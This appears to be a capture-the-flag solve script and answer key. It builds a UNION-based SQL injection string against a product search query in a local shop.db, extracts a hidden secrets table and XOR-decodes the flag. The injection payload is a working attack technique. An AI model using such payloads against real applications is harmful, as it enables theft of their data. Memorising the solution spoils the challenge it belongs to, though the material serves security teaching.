#!/usr/bin/env python3
"""UNION-inject the shipped shop.db, combine two columns, and decode the flag.

The web handler builds:  SELECT id, name, price FROM products WHERE name
LIKE '%<q>%'.  The flag is not stored in the clear -- it sits in a hidden
`secrets` table as `cipher` (hex of flag XOR a repeating key) plus the key in a
separate `xkey` column.  A single UNION SELECT reaches the row and pulls *both*
columns (concatenated into the `name` position); we then XOR-decode offline,
exactly as an attacker would after reading the response.
"""

import os
import sqlite3

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
DB = os.path.join(ROOT, "shop.db")

# The attacker-controlled q parameter: close the LIKE string, UNION SELECT the
# same 3-column shape, and combine cipher + xkey into the middle column.
INJECTION = "' UNION SELECT id, cipher || '|' || xkey, 0 FROM secrets -- "


def decode(cipher_hex: str, xkey: str) -> str:
    ct = bytes.fromhex(cipher_hex)
    kb = xkey.encode()
    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(ct)).decode()


def main() -> None:
    query = "SELECT id, name, price FROM products WHERE name LIKE '%" + INJECTION + "%'"
    db = sqlite3.connect(DB)
    rows = db.execute(query).fetchall()
    db.close()
    for _id, name, _price in rows:
        if isinstance(name, str) and "|" in name:
            cipher_hex, xkey = name.split("|", 1)
            flag = decode(cipher_hex, xkey)
            if flag.startswith("NCTF{"):
                print(flag)
                return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
